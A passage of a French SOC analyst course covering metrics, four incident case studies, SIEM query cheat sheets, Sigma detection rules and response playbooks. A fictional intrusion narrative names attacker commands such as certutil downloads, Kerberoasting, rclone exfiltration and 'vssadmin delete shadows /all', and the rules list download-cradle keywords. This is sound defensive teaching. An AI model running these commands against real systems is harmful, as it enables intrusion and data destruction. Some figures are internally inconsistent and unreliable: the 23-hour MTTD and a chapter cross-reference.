La CTI identifie les vulnérabilités exploitées ITW et les corrèle avec les acteurs (cours CTI Ch.21). Le vuln management scanne l'environnement et identifie les assets vulnérables. Le SOC reçoit le croisement des deux (vulnérabilité exploitée ITW × asset exposé dans notre environnement) et agit : flash alert au RSSI et à l'IT, monitoring renforcé des assets exposés (détection des tentatives d'exploitation), et vérification que le patch est déployé dans les délais (le SOC ne patche pas — il vérifie que le patching a eu lieu et alerte si ce n'est pas le cas).

Le VOC n'est pas un remplacement du vulnerability management classique — c'est l'ajout d'une dimension opérationnelle (« cette vulnérabilité est exploitée maintenant, par un acteur qui nous cible, et nos systèmes sont exposés — il faut agir dans les heures, pas dans les semaines ») qui transforme un processus de gestion en un processus de réponse.

---

### Chapitre 35 — Métriques SOC, reporting et maturité

Les métriques qui comptent : **MTTD** (Mean Time to Detect — temps entre l'événement malveillant et sa détection par le SOC ; cible : < 1h pour les critiques — dans FALCONWATCH, le MTTD est de ~23h car l'infection initiale samedi 08h12 n'a été détectée que lundi 07h42), **MTTR** (Mean Time to Respond — temps entre la détection et le confinement ; cible : < 4h — dans FALCONWATCH, le MTTR est de ~45 minutes entre la détection et l'isolation des postes), **taux de FP** (% d'alertes faussement positives ; cible : < 15 % — au-dessus de 30 %, le SOC est en surcharge), **backlog** (alertes en attente de triage ; cible : proche de 0 en fin de shift), **couverture ATT&CK** (% de techniques couvertes par des règles testées ; amélioration continue via le purple team), et **taux de détection SOC** (% d'incidents détectés par le SOC vs découverts par d'autres moyens — utilisateur, tiers, médias ; cible : > 80 %).

Les niveaux de maturité : **Niveau 1 (Réactif)** — le SOC traite les alertes mais ne crée pas de détections custom et ne fait pas de hunting. **Niveau 2 (Proactif)** — le SOC a un detection engineer qui crée des règles basées sur la CTI, et fait du hunting régulier (hebdomadaire). **Niveau 3 (Adaptatif)** — purple team régulier, validation continue des détections, gap analysis CTI-driven, automatisation SOAR mature. **Niveau 4 (Intelligence-driven)** — la CTI guide toute la stratégie de détection, le hunting est continu, les détections sont validées par purple team, et les métriques d'impact (incidents prévenus) sont mesurées.

---

### Chapitre 36 — Le SOC en 2026 : tendances et évolutions

Les tendances réelles (pas le marketing). Le **SOC cloud-native** : les logs sont dans le cloud, le SIEM est dans le cloud, les endpoints sont gérés via le cloud — le SOC on-premise disparaît progressivement. L'**IA comme assistant** : les LLM pour résumer les alertes, suggérer des requêtes, aider à la rédaction de tickets — utile et productif ; les LLM pour qualifier automatiquement les alertes — risqué (les hallucinations en sécurité ont des conséquences) ; les modèles ML pour le scoring et la priorisation — mature et productif (risk-based alerting de Splunk ES, fusion rules de Sentinel). La **convergence SOC/CTI** : l'analyste SOC de 2026 consomme du renseignement CTI quotidiennement — les profils d'acteurs, les TTP, et les gap analyses sont intégrés dans son workflow. L'**extension du périmètre** : OT/IoT (les systèmes industriels sont maintenant surveillés par le SOC), cloud multi-provider, SaaS, identité — le SOC ne surveille plus seulement les endpoints et le réseau, il surveille tout.

---

## PARTIE VIII — ÉTUDES DE CAS ET SYNTHÈSE

*4 cas complets qui appliquent l'intégralité du cours. Chaque cas est une investigation de bout en bout — pas un mini-exemple.*

---

### Chapitre 37 — Cas complet : intrusion par phishing avec mouvement latéral et pré-ransomware (synthèse FALCONWATCH)

Synthèse du fil rouge sous forme de cas autonome. 48 heures d'intrusion reconstituées de bout en bout.

**Samedi 08h12 — Accès initial :** Marc Dubois (ingénieur de production) reçoit un email de spearphishing envoyé depuis le compte compromis d'un sous-traitant de maintenance (les credentials VPN du sous-traitant avaient été vendues sur Russian Market 3 semaines plus tôt). Le document Word contient une macro VBA qui exécute certutil pour télécharger lib.dll depuis `update-norexia[.]xyz` et l'exécute via rundll32. Le RAT s'installe et commence le beaconing HTTPS vers `185.xx.xx.xx` toutes les 45 secondes.

**Samedi 22h30 — Reconnaissance et mouvement latéral :** l'attaquant exécute des commandes de reconnaissance (`whoami /all`, `net group "Domain Admins"`, `nltest /domain_trusts`). Il utilise PsExec pour se déplacer vers WKS-IT-045 (poste d'un admin IT — cible de valeur pour les credentials et les accès).

**Dimanche 06h15 — Kerberoasting et staging :** depuis WKS-PROD-112, l'attaquant lance un Kerberoasting ciblant 8 comptes de service (détectable : 8 requêtes 4769 RC4 en 2 minutes depuis une seule machine). Il lance rclone sur WKS-IT-045 pour exfiltrer 12 Go de données R&D (formulations chimiques propriétaires) vers un bucket S3 externe.

**Lundi 04h-07h — Préparation ransomware :** suppression des shadow copies sur 3 machines (`vssadmin delete shadows /all`). Un binaire BlackBasta est déposé dans `C:\Windows\Temp\` sur 3 machines — mais pas encore exécuté. L'attaquant prépare le déploiement massif.

**Lundi 07h42 — Détection :** l'EDR CrowdStrike détecte le certutil + rundll32 sur WKS-PROD-112 (l'alerte remonte avec un délai car le processus était dormant depuis samedi et a été re-flaggé lors d'un re-scan comportemental). Karim prend l'alerte.

**Lundi 07h42-08h30 — Triage et investigation L2 :** Karim reconstitue le process tree, confirme le VP, pivote vers le réseau (beaconing C2), pivote vers les autres machines (découverte de WKS-IT-045 compromis), pivote vers l'AD (Kerberoasting détecté).

**Lundi 08h30 — Escalade :** Karim émet le SITREP et escalade vers l'IR lead et le RSSI Norexia. Sévérité : critique (accès OT potentiel, pré-ransomware confirmé, exfiltration de données R&D).

**Lundi 08h30-09h15 — Confinement :** isolation des 2 postes via EDR, blocage du C2 au proxy et au firewall, reset des credentials de marc.dubois et svc-scada (le mot de passe svc-scada n'avait pas encore été cracké — confirmé par l'absence de 4624 avec ce compte depuis une machine non autorisée), suppression du binaire BlackBasta des 3 machines.

**Post-incident :** REX complet. 3 nouvelles règles Sigma (certutil download cradle, Kerberoasting > 5 comptes en 5 min, vssadmin delete shadows). Sysmon déployé sur les postes d'ingénierie OT (n'y était pas). Playbook ransomware mis à jour. IoC partagés avec la CTI → profil d'acteur enrichi. Le MTTD de 23h est analysé : la détection initiale samedi était manquée car le certutil a été exécuté une seule fois (sous le seuil) — la re-détection lundi est due au re-scan comportemental de l'EDR qui a corrélé le certutil avec le rundll32 en persistance.

---

### Chapitre 38 — Cas complet : compromission de compte M365 avec BEC

Un utilisateur du département finance d'un client CyberShield signale des emails suspects envoyés depuis son propre compte. L'investigation cloud pure : sign-in logs Azure AD (connexion depuis un VPS néerlandais, token replay après phishing AitM — le MFA a été « passé » par interception du token de session), M365 UAL (création de règle de forwarding vers une adresse ProtonMail, accès SharePoint Finance avec téléchargement de 45 fichiers, envoi de 3 emails BEC — demande de virement de 180 000 € au prestataire comptable avec un nouveau RIB), corrélation proxy (le phishing AitM initial identifié — kit EvilGinx2 hébergé sur un domaine de typosquatting), et scope assessment (recherche des IoC du kit AitM dans les logs proxy → 2 autres utilisateurs ont cliqué mais sans soumission de credentials → le scope est limité à 1 compte compromis). Confinement : reset mot de passe + révocation de toutes les sessions + suppression de la règle de forwarding + blocage du domaine AitM + notification du prestataire comptable (le virement a été bloqué à temps). Le cas illustre l'investigation cloud pure sans composante endpoint.

---

### Chapitre 39 — Cas complet : threat hunt sur les LOLBins

3 mois après FALCONWATCH, le SOC CyberShield mène un hunt proactif sur les LOLBins dans l'environnement Norexia. Hypothèse : « si un attaquant est encore présent ou si un nouvel attaquant a pénétré, il utilise probablement des LOLBins pour éviter la détection ». Le hunt utilise le stacking (quelles sont les utilisations les plus rares de certutil, mshta, bitsadmin, regsvr32, rundll32 dans le parc sur les 30 derniers jours ?), l'analyse de contexte (les 5 occurrences de certutil -urlcache sur des postes non-IT sont-elles légitimes ?), et l'investigation d'une anomalie (un poste d'ingénierie utilise mshta pour charger un HTA depuis un partage réseau — investigation → c'est un script de maintenance légitime mais non documenté et non sécurisé — BTP). Résultat : pas de compromission trouvée, mais le script non sécurisé est corrigé, la baseline est enrichie (5 nouvelles exclusions documentées), et la confiance dans la posture post-incident est renforcée. Le cas illustre un hunt complet qui ne trouve PAS de compromission — et qui a quand même de la valeur.

---

### Chapitre 40 — Cas complet : 8 heures d'un analyste SOC — la réalité du shift

Ce cas est un format unique : une journée de travail complète, pas une investigation unique. 8 heures de shift avec les alertes réelles, les FP, les BTP, les doutes, et le VP qui change tout.

**07h15 — Alerte « Impossible Travel » (VPN) :** un utilisateur se connecte au VPN depuis Paris à 07h00 et depuis le Brésil à 07h12. Investigation : l'utilisateur utilise un VPN personnel qui sort par un nœud brésilien. L1 vérifie le user-agent et le device → identiques. Conclusion : **FP**. Temps : 8 minutes.

**08h02 — Alerte « PowerShell -EncodedCommand » (serveur) :** PowerShell avec -enc exécuté sur un serveur de production. Investigation : le processus parent est SCCM (System Center Configuration Manager). La commande décodée est un script de déploiement de patch légitime. Conclusion : **BTP** (la détection est correcte — PowerShell -enc a bien été exécuté — mais l'action est légitime). L'analyste documente le BTP et vérifie que SCCM est dans la liste d'exclusion de la règle — il n'y est pas. Recommandation : ajouter l'exclusion SCCM (documentée). Temps : 12 minutes.

**09h30 — Alerte « Internal Port Scan » (IDS) :** scan de ports depuis 10.0.2.15 vers 10.0.2.0/24. Investigation : l'IP source est le scanner Nessus. Conclusion : **FP** (l'IP de Nessus aurait dû être exclue de la règle IDS). L'analyste crée un ticket de tuning pour ajouter l'exclusion. Temps : 5 minutes.

**10h45 — Alerte « Data Exfiltration — Large Upload » (proxy) :** 2.1 Go uploadés vers Google Drive depuis un poste du département RH. Investigation : l'utilisatrice RH partage un dossier de candidatures avec un cabinet de recrutement externe — validé par son manager via email. Conclusion : **FP** (activité métier légitime). L'analyste note que la catégorisation proxy de Google Drive comme « exfiltration » génère trop de FP → recommandation de tuning (exclure Google Drive des alertes de volume OU ajouter une condition sur le département source). Temps : 15 minutes.

**11h30 — Alerte « Mimikatz Detected » (EDR) :** CrowdStrike détecte la signature de Mimikatz sur DC01 (le contrôleur de domaine du client). **Le monde change.** L'analyste L1 escalade immédiatement au L2. L'investigation révèle : un processus `lsass_dump.exe` (renommé, mais le hash matche Mimikatz) exécuté par le compte `admin-it-03` à 11h28. Le process tree montre `cmd.exe → lsass_dump.exe` avec le parent `explorer.exe` — l'attaquant a une session interactive sur le DC. L'analyste L2 pivote : 4624 type 10 (RDP) sur DC01 depuis 10.0.1.87 (WKS-ADMIN-03, poste de l'admin IT n°3) à 11h25. L'admin IT n°3 est contacté : « Non, ce n'est pas moi, je suis en réunion depuis 10h. » → **Compromission confirmée du DC.** Escalade IR immédiate. Confinement : isolation de WKS-ADMIN-03 et de DC01 (après coordination avec l'IT — isoler un DC impacte tout le domaine). Le shift bascule en mode incident — le reste des alertes est transféré à un collègue.

Le cas illustre la réalité du métier : 4 FP/BTP pour 1 VP, la gestion du temps et de l'énergie, la priorisation (les alertes de 07h-11h sont traitées calmement ; l'alerte de 11h30 déclenche l'adrénaline), et le moment où une journée « normale » bascule en incident majeur.

---

## ANNEXES

---

### Annexe A — Glossaire SOC

| Terme               | Définition                                                                       |
| ------------------- | -------------------------------------------------------------------------------- |
| **ATT&CK**          | Framework MITRE des tactiques, techniques et procédures adverses                 |
| **Beaconing**       | Pattern de communication périodique entre un malware et son C2                   |
| **BEC**             | Business Email Compromise — fraude par compromission de messagerie               |
| **BTP**             | Benign True Positive — alerte techniquement correcte sur une action légitime     |
| **C2**              | Command and Control — infrastructure de commande d'un malware                    |
| **CIM**             | Common Information Model — modèle de normalisation des données (Splunk)          |
| **CMDB**            | Configuration Management Database — inventaire des assets IT                     |
| **Containment**     | Actions de confinement pour limiter la propagation d'un incident                 |
| **DGA**             | Domain Generation Algorithm — algorithme de génération de domaines C2            |
| **DLL sideloading** | Chargement d'une DLL malveillante via le search order d'une application légitime |
| **EDR**             | Endpoint Detection and Response — détection et réponse sur les endpoints         |
| **EQL**             | Event Query Language — langage Elastic pour les séquences d'événements           |
| **EPSS**            | Exploit Prediction Scoring System — probabilité d'exploitation d'une CVE         |
| **FP**              | False Positive — alerte sans menace réelle                                       |
| **FN**              | False Negative — menace non détectée                                             |
| **Golden hour**     | Fenêtre critique entre le mouvement latéral et le déploiement du ransomware      |
| **Hunting**         | Recherche proactive de menaces non détectées par les règles                      |
| **IoC**             | Indicator of Compromise — artefact technique d'une compromission                 |
| **JA3/JA4**         | Fingerprint TLS pour identifier des clients réseau par leur négociation          |
| **Kerberoasting**   | Attaque AD consistant à craquer les mots de passe via les tickets Kerberos       |
| **KEV**             | Known Exploited Vulnerabilities — catalogue CISA des CVE exploitées ITW          |
| **KQL**             | Kusto Query Language (Sentinel) ou Kibana Query Language (Elastic)               |
| **LOLBin**          | Living Off the Land Binary — binaire système légitime détourné                   |
| **MDR**             | Managed Detection and Response — service managé de détection                     |
| **MTTD**            | Mean Time to Detect — temps moyen de détection                                   |
| **MTTR**            | Mean Time to Respond — temps moyen de réponse                                    |
| **MSSP**            | Managed Security Service Provider — prestataire de services de sécurité          |
| **NDR**             | Network Detection and Response — détection réseau                                |
| **NTP**             | Network Time Protocol — synchronisation horaire                                  |
| **Playbook**        | Procédure structurée de réponse à un type d'incident                             |
| **Purple team**     | Collaboration offensive-défensive pour valider les détections                    |
| **REX**             | Retour d'Expérience — analyse post-incident pour l'amélioration                  |
| **Sigma**           | Format universel de règles de détection (YAML), convertible en SPL/KQL/EQL       |
| **SIEM**            | Security Information and Event Management — outil central du SOC                 |
| **SITREP**          | Situation Report — rapport de situation lors d'une escalade                      |
| **SOAR**            | Security Orchestration, Automation and Response                                  |
| **SPL**             | Search Processing Language — langage de requête Splunk                           |
| **Stacking**        | Technique de hunting par agrégation et comptage pour trouver les outliers        |
| **Sysmon**          | System Monitor — outil Microsoft de télémétrie avancée                           |
| **TLP**             | Traffic Light Protocol — classification de la diffusion du renseignement         |
| **TTP**             | Tactics, Techniques, and Procedures — comportements de l'attaquant               |
| **UAL**             | Unified Audit Log — journal d'audit Microsoft 365                                |
| **UEBA**            | User and Entity Behavior Analytics — détection d'anomalies comportementales      |
| **VOC**             | Vulnerability Operations Center — gestion opérationnelle des vulnérabilités      |
| **VP**              | Vrai Positif (True Positive) — alerte confirmée comme menace réelle              |
| **VQL**             | Velociraptor Query Language — langage de Velociraptor pour le hunting            |
| **XDR**             | Extended Detection and Response — détection multi-sources                        |
| **YARA**            | Langage de règles pour l'identification de fichiers malveillants                 |
| **CVE**             | Identifiant de la vulnérabilité                                                  |
| **CWE**             | Faiblesse de conception sous-jacente                                             |
| **CVSS**            | Score de sévérité                                                                |
| **EPSS**            | Probabilité d'exploitation                                                       |
| **KEV**             | Vuln exploitées activement ?                                                     |

---

### Annexe B — Event IDs Windows : référence rapide

| Event ID | Source | Description | Interprétation SOC | FP courants |
|----------|--------|-------------|-------------------|-------------|
| **4624** | Security | Logon réussi | Qui s'est connecté, depuis où, quel type (2=interactif, 3=réseau, 10=RDP) | Comptes de service (type 3 massif) |
| **4625** | Security | Logon échoué | Brute force, password spraying, credential stuffing | Apps mal configurées, mots de passe expirés |
| **4648** | Security | Logon explicit credentials | Mouvement latéral (runas, PsExec -u), pass-the-hash | Admin IT utilisant runas légitime |
| **4672** | Security | Privileges spéciaux | Connexion admin, élévation de privilèges | Comptes admin légitimes |
| **4688** | Security | Process creation | Exécution suspecte (avec command line si GPO activée) | Scripts d'administration légitimes |
| **4698** | Security | Scheduled task created | Persistence (tâche planifiée malveillante) | Tâches SCCM, GPO, admin |
| **4720** | Security | User account created | Création de compte par l'attaquant | Provisioning IT légitime |
| **4728/4732** | Security | Member added to group | Ajout à Domain Admins ou groupe privilégié | Changements IT documentés |
| **4769** | Security | Kerberos TGS request | Kerberoasting si encryption RC4 (0x17) en volume | Authentification Kerberos normale |
| **7045** | System | Service installed | PsExec (PSEXESVC), malware persistence | Installation de logiciels légitimes |
| **1102** | Security | Audit log cleared | Anti-forensics — effacement des traces | Rotation de logs planifiée (rare) |
| **1** | Sysmon | Process create | Process tree complet avec hash et parent | Volume élevé (filtrer par config) |
| **3** | Sysmon | Network connection | Quel processus contacte quelle IP | Volume élevé (filtrer par config) |
| **7** | Sysmon | Image loaded | DLL sideloading, DLL injection | DLL légitimes (filtrer par signature) |
| **10** | Sysmon | Process access | Accès LSASS (credential dumping) | AV, EDR accédant à LSASS |
| **11** | Sysmon | File create | Drop de malware, staging de fichiers | Création de fichiers légitimes (config) |
| **22** | Sysmon | DNS query | Résolution de domaine par processus | Volume élevé (filtrer par config) |

---

### Annexe C — Cheat sheets requêtes SIEM

*10 requêtes essentielles dans les 3 langages principaux.*

#### 1. Brute force / Password spraying

**SPL :** `index=windows EventCode=4625 | stats count by src_ip, TargetUserName | where count > 10 | sort -count`

**KQL (Sentinel) :** `SecurityEvent | where EventID == 4625 | summarize count() by IpAddress, TargetAccount | where count_ > 10 | order by count_ desc`

**KQL (Elastic) :** `event.code: "4625"` puis agrégation dans Lens/Dashboard

#### 2. Mouvement latéral PsExec

**SPL :** `index=windows EventCode=7045 ServiceName="PSEXESVC" | table _time host ServiceFileName AccountName`

**KQL (Sentinel) :** `Event | where EventID == 7045 | where RenderedDescription contains "PSEXESVC" | project TimeGenerated, Computer, RenderedDescription`

#### 3. Kerberoasting

**SPL :** `index=windows EventCode=4769 TicketEncryptionType=0x17 | stats count values(ServiceName) by IpAddress | where count > 5`

**KQL (Sentinel) :** `SecurityEvent | where EventID == 4769 and TicketEncryptionType == "0x17" | summarize count(), make_set(ServiceName) by IpAddress | where count_ > 5`

#### 4. Beaconing C2

**SPL :** `index=proxy src_ip="10.x.x.x" | sort _time | streamstats current=f last(_time) as prev by src_ip dest | eval interval=_time-prev | stats avg(interval) stdev(interval) count by src_ip dest | eval jitter=stdev/avg*100 | where jitter < 15 AND count > 50`

#### 5. PowerShell obfusqué

**SPL :** `index=sysmon EventCode=1 Image="*powershell*" (CommandLine="*-enc*" OR CommandLine="*-nop*" OR CommandLine="*IEX*" OR CommandLine="*downloadstring*") | table _time host user CommandLine ParentImage`

#### 6. Certutil download cradle

**SPL :** `index=sysmon EventCode=1 Image="*certutil*" (CommandLine="*urlcache*" OR CommandLine="*verifyctl*") | table _time host user CommandLine ParentImage`

#### 7. Shadow copy deletion (pré-ransomware)

**SPL :** `index=sysmon EventCode=1 (CommandLine="*vssadmin*delete*shadow*" OR CommandLine="*wmic*shadowcopy*delete*") | table _time host user CommandLine`

#### 8. Forwarding rule M365

**KQL (Sentinel) :** `OfficeActivity | where Operation in ("New-InboxRule", "Set-InboxRule") | where Parameters contains "ForwardTo" or Parameters contains "RedirectTo" | project TimeGenerated, UserId, Operation, Parameters`

#### 9. Timeline utilisateur

**SPL :** `index=* user="marc.dubois" earliest=-48h | sort _time | table _time index sourcetype action src_ip dest_ip dest CommandLine`

#### 10. Scope IP (quels autres hosts contactent une IP suspecte)

**SPL :** `index=firewall dest_ip="185.xx.xx.xx" | stats count earliest(_time) latest(_time) by src_ip | sort -count`

---

### Annexe D — Règles Sigma de référence

*5 règles Sigma complètes commentées.*

**Règle 1 — Certutil Download Cradle :** (voir Ch.7 pour la règle complète commentée)

**Règle 2 — Kerberoasting (>5 comptes en 5 min) :**
```yaml
title: Potential Kerberoasting - Multiple RC4 TGS Requests
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4769
        TicketEncryptionType: '0x17'
    timeframe: 5m
    condition: selection | count(ServiceName) by IpAddress > 5
level: high
tags:
    - attack.credential_access
    - attack.t1558.003
```

**Règle 3 — Shadow Copy Deletion :**
```yaml
title: Shadow Copy Deletion - Ransomware Precursor
logsource:
    category: process_creation
    product: windows
detection:
    selection_vssadmin:
        Image|endswith: '\vssadmin.exe'
        CommandLine|contains|all:
            - 'delete'
            - 'shadows'
    selection_wmic:
        Image|endswith: '\wmic.exe'
        CommandLine|contains|all:
            - 'shadowcopy'
            - 'delete'
    condition: selection_vssadmin or selection_wmic
level: critical
tags:
    - attack.impact
    - attack.t1490
```

**Règle 4 — PsExec Remote Service :**
```yaml
title: PsExec Service Installation
logsource:
    product: windows
    service: system
detection:
    selection:
        EventID: 7045
        ServiceName: 'PSEXESVC'
    condition: selection
level: high
tags:
    - attack.lateral_movement
    - attack.t1021.002
```

**Règle 5 — Suspicious PowerShell Download :**
```yaml
title: Suspicious PowerShell Download Cradle
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\powershell.exe'
        CommandLine|contains:
            - 'Invoke-WebRequest'
            - 'wget'
            - 'curl'
            - 'DownloadString'
            - 'DownloadFile'
            - 'IWR'
    condition: selection
level: high
tags:
    - attack.execution
    - attack.t1059.001
    - attack.command_and_control
    - attack.t1105
```

---

### Annexe E — Templates SOC

#### Template ticket d'incident

```
TICKET #[numéro] — [TITRE COURT]
Sévérité : [Critique/Haute/Moyenne/Basse]
Statut : [Ouvert/En investigation/Escalé/Clos]
Qualification : [VP/FP/BTP/Inconclusive]

RÉSUMÉ (2 lignes)
[Quoi — Qui — Quand]

CONTEXTE
  Règle : [nom de la règle, technique ATT&CK]
  Asset : [hostname, criticité]
  Utilisateur : [nom, département, niveau de privilège]

OBSERVATIONS (faits horodatés)
  [HH:MM:SS UTC — Source — Événement — Détail]

ANALYSE
  Hypothèse(s) : [description]
  Éléments confirmant/infirmant : [données]
  Conclusion : [VP/FP/BTP avec justification]

ACTIONS RÉALISÉES
  [Action — Horodatage — Résultat]

RECOMMANDATIONS
  [Actions restantes — Responsable — Délai]

ANALYSTE : [nom]    DATE : [date]    SHIFT : [horaire]
```

#### Template SITREP d'escalade

```
⚠️ SITREP — [CLIENT] — [SÉVÉRITÉ]
Date/Heure : [UTC]    Analyste : [nom]

QUOI : [2 phrases résumant l'incident]
QUAND : [Timeline résumée]
QUI : [Comptes et systèmes impactés]
ACTIONS PRISES : [Ce qui a été fait]
ACTIONS RECOMMANDÉES : [Ce qui doit être fait]
CE QU'ON NE SAIT PAS : [Lacunes, incertitudes]

Prochaine mise à jour : [heure prévue]
```

---

### Annexe F — Playbooks de référence

#### Playbook Phishing

1. Vérifier si l'email a été reçu par d'autres utilisateurs (email gateway → scope)
2. Vérifier les clics dans les logs proxy (URL visitée, POST effectué ?)
3. Si credentials soumis : reset mot de passe + révocation sessions Azure AD/M365 + vérification MFA
4. Vérifier les inbox rules (forwarding, redirection)
5. Vérifier les connexions suspectes post-clic (sign-in logs)
6. Bloquer domaine/URL au proxy et à l'email gateway
7. Vérifier SharePoint/OneDrive pour exfiltration
8. Notifier l'utilisateur et sensibiliser
9. Documenter et clôturer

#### Playbook Ransomware (pré-déploiement détecté)

1. Isolation IMMÉDIATE des machines détectées (EDR containment)
2. Isolation réseau du segment (firewall — empêcher propagation)
3. Vérifier l'étendue (C2 contacté par d'autres machines ? shadow copies supprimées ailleurs ?)
4. Préserver les preuves (ne PAS redémarrer, ne PAS nettoyer)
5. Escalade IR immédiate + notification RSSI client
6. Identifier le vecteur d'accès initial (pour bloquer la re-infection)
7. Vérifier les backups (intégrité, accessibilité, non compromis)
8. NE PAS communiquer publiquement avant validation direction/juridique

---

### Annexe G — Ressources et formation

#### Certifications

| Certification | Organisme | Focus | Niveau |
|--------------|-----------|-------|--------|
| CompTIA CySA+ | CompTIA | Analyse sécurité, SOC fondamental | Intermédiaire |
| BTL1 (Blue Team Level 1) | Security Blue Team | Investigation SOC, triage, SIEM | Intermédiaire |
| BTL2 (Blue Team Level 2) | Security Blue Team | Investigation avancée, hunting, IR | Avancé |
| SC-200 | Microsoft | Sentinel, MDE, M365 Defender | Intermédiaire |
| Splunk Core Certified User | Splunk | SPL fondamental | Débutant |
| GCIH (Incident Handler) | SANS/GIAC | IR et handling d'incidents | Avancé |
| GCIA (Intrusion Analyst) | SANS/GIAC | Analyse réseau et intrusion | Avancé |
| GCDA (Certified Detection Analyst) | SANS/GIAC | Detection engineering | Avancé |

#### Plateformes d'entraînement

| Plateforme | Type | Focus |
|-----------|------|-------|
| CyberDefenders | CTF Blue Team | Investigations SOC avec datasets réels |
| LetsDefend | Simulation | Simulation SOC avec alertes, triage, investigation |
| TryHackMe | Parcours | Parcours SOC Analyst (L1 et L2) |
| Blue Team Labs Online | CTF | Investigations blue team variées |
| Boss of the SOC (BOTS) | Dataset Splunk | Compétition SOC sur datasets Splunk |
| SANS Cyber Ranges | Simulation | Exercices IR et SOC avancés |

#### Datasets d'entraînement

| Dataset | Source | Contenu |
|---------|--------|---------|
| EVTX-ATTACK-SAMPLES | GitHub | Event Logs Windows simulant des attaques ATT&CK |
| SecurityDatasets (OTRF) | GitHub | Datasets multi-sources pour le hunting |
| Atomic Red Team | Red Canary | Tests unitaires par technique ATT&CK |
| SigmaHQ | GitHub | Règles Sigma communautaires (3000+) |

#### Blogs et sources quotidiennes

| Source | Type | Pertinence SOC |
|--------|------|---------------|
| The DFIR Report | Blog | Intrusions complètes analysées pas à pas |
| Detection Engineering Weekly | Newsletter | Actualité du detection engineering |
| Sigma HQ Blog | Blog | Nouvelles règles, bonnes pratiques Sigma |
| Splunk Security Essentials | App Splunk | Use cases pré-construits avec SPL |
| Microsoft Sentinel Community | GitHub | Requêtes KQL, workbooks, playbooks |
| Elastic Security Labs | Blog | Recherche en détection, règles EQL |
| Red Canary Threat Detection Report | Rapport annuel | Techniques les plus observées par année |

---

> **Note de clôture**
>
> Ce cours a été conçu pour former au métier d'analyste SOC tel qu'il se pratique réellement — pas dans sa version idéalisée des slides de certification, mais dans sa réalité quotidienne : le flux d'alertes, les faux positifs, les doutes, les pivots qui mènent à des impasses, et le moment où une alerte banale se révèle être le premier signal d'une intrusion critique.
>
> L'opération FALCONWATCH qui traverse les 34 premiers chapitres illustre cette réalité : Karim ne reçoit pas une alerte proprement packagée qui dit « vous êtes compromis par BlackBasta » — il reçoit une alerte sur un certutil + rundll32 qui pourrait être n'importe quoi, et il doit, couche après couche, requête après requête, pivot après pivot, reconstituer l'histoire de 48 heures d'intrusion pour comprendre que son client est à quelques heures d'un ransomware.
>
> Le Ch.38 (la journée de shift) est peut-être le chapitre le plus important du cours : il montre que le métier, c'est 80 % de FP traités avec rigueur et 20 % d'investigations qui comptent — et que la qualité du travail sur les 80 % de FP (documentation, tuning, recommandations) est ce qui permet de traiter les 20 % d'investigations critiques avec l'efficacité nécessaire.
>
> *Détecter • Investiguer • Répondre • Construire — avec rigueur et endurance.*
